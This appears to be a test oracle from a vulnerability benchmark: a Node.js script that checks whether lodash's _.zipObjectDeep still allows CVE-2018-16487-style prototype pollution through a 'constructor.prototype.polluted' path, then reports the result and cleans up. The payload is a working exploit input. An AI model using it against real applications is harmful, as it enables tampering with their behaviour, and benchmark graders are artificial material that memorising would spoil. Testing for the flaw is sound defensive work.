'use strict';
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

let _;
try {
  _ = require('lodash');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'oracle_zipdeep_' + process.pid + '_' + Date.now();
const tmpFile = path.join(os.tmpdir(), marker + '.json');

let operation_completed = false;

function cleanupPollution() {
  try {
    if (Object.prototype.hasOwnProperty.call(Object.prototype, 'polluted')) {
      delete Object.prototype.polluted;
    }
  } catch (e) { /* ignore */ }
}

// Defensive clean slate before starting.
cleanupPollution();

try {
  // --- Benign operation first ---
  // _.zipObjectDeep builds a nested object from an array of deep paths and
  // an array of values. This is the normal, documented use case.
  const benignResult = _.zipObjectDeep(['a.b', 'a.c', 'd'], [1, 2, 3]);

  const benignOk =
    benignResult &&
    typeof benignResult === 'object' &&
    benignResult.a &&
    benignResult.a.b === 1 &&
    benignResult.a.c === 2 &&
    benignResult.d === 3;

  if (!benignOk) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign _.zipObjectDeep did not produce expected shape: ' + JSON.stringify(benignResult) });
    process.exit(0);
  }

  // Touch /tmp with a unique marker to confirm filesystem fixture access works.
  fs.writeFileSync(tmpFile, JSON.stringify({ marker, benignResult }));
  const readBack = JSON.parse(fs.readFileSync(tmpFile, 'utf8'));
  if (!readBack || readBack.marker !== marker) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'tmp fixture roundtrip failed' });
    process.exit(0);
  }
  try { fs.unlinkSync(tmpFile); } catch (e) { /* ignore cleanup errors */ }

  // Benign operation succeeded: only now may operation_completed become true.
  operation_completed = true;

  // --- Malicious operation ---
  // CVE-2018-16487-style prototype pollution via _.zipObjectDeep. Using a
  // 'constructor.prototype.<prop>' path segment reaches Object.prototype
  // through the constructor reference in vulnerable lodash, which lacks
  // guards against dangerous key segments in its internal baseSet routine.
  const maliciousPaths = ['constructor.prototype.polluted'];
  const maliciousValues = ['yes'];

  let threwDuringMalicious = false;
  let maliciousErrMsg = '';
  try {
    _.zipObjectDeep(maliciousPaths, maliciousValues);
  } catch (callErr) {
    threwDuringMalicious = true;
    maliciousErrMsg = String(callErr && callErr.message);
  }

  // Check pollution on a completely new, unrelated plain object literal,
  // never touched by either call above.
  const freshObj = {};
  const ownCheck = Object.prototype.hasOwnProperty.call(Object.prototype, 'polluted');
  const polluted = freshObj.polluted === 'yes';
  const exploit_succeeded = !!(polluted && ownCheck);

  let evidence;
  if (threwDuringMalicious) {
    evidence = 'malicious _.zipObjectDeep threw: ' + maliciousErrMsg + '; Object.prototype.hasOwnProperty(polluted)=' + String(ownCheck) + '; fresh {}.polluted=' + String(freshObj.polluted);
  } else {
    evidence = exploit_succeeded
      ? 'Object.prototype.polluted === "yes" after _.zipObjectDeep(["constructor.prototype.polluted"],["yes"]); fresh {}.polluted=' + String(freshObj.polluted)
      : 'No pollution observed on Object.prototype after malicious _.zipObjectDeep; fresh {}.polluted=' + String(freshObj.polluted) + '; ownCheck=' + String(ownCheck);
  }

  cleanupPollution();

  finish({ operation_completed: true, exploit_succeeded, evidence });
} catch (unexpectedErr) {
  cleanupPollution();
  if (operation_completed) {
    finish({ operation_completed: true, exploit_succeeded: false, evidence: 'unexpected exception after benign success, treated as blocked: ' + String(unexpectedErr && unexpectedErr.message) });
  } else {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'unexpected exception before benign success: ' + String(unexpectedErr && unexpectedErr.message) });
  }
}
